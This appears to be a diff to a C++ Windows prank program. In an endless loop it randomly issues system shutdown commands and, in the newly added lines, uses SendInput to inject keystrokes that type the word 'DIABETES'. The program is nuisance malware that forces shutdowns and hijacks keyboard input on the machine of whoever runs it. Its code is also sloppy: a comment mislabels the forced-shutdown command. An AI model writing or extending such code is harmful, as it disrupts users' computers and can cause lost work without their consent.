@@ -1,12 +1,13 @@
 #include<cstdlib>
 #include<iostream>
 #include<ctime>
+#define WINVER 0x0500
 #include <windows.h>
 #include <mmsystem.h>
 #include <shell32.h>
 using namespace std;
 
-
+const int ARR_LENGTH = 10;
 
 void sleep(unsigned milliseconds) {
         Sleep(milliseconds * 1000);
@@ -15,6 +16,7 @@ void sleep(unsigned milliseconds) {
 
 int main() {
 
+	char chaPhrase[ARR_LENGTH] = "DIABETES";
 
 	while (true) {
 		
@@ -45,11 +47,20 @@ int main() {
 			system("shutdown -s");
 		} 
 		else if (rand() % 50 == 0) {
-			// Code to shutdown computer
+			// Code to close programs
 			system("shutdown -f");
 		}
+		else if (rand() % 5 == 0) {
+			//Types out chaPhrase array
+			for (int i = 0; i < ARR_LENGTH; i++) {
+				keyInput.ki.wVk = chaPhrase[i];
+				keyInput.ki.dwFlags = 0;
+				SendInput(1, &keyInput, sizeof(INPUT));
+			}
 		
-		
+			keyInput.ki.dwFlags = KEYEVENTF_KEYUP;
+			SendInput(1, &keyInput, sizeof(INPUT));
+		}
 		
 		
 		
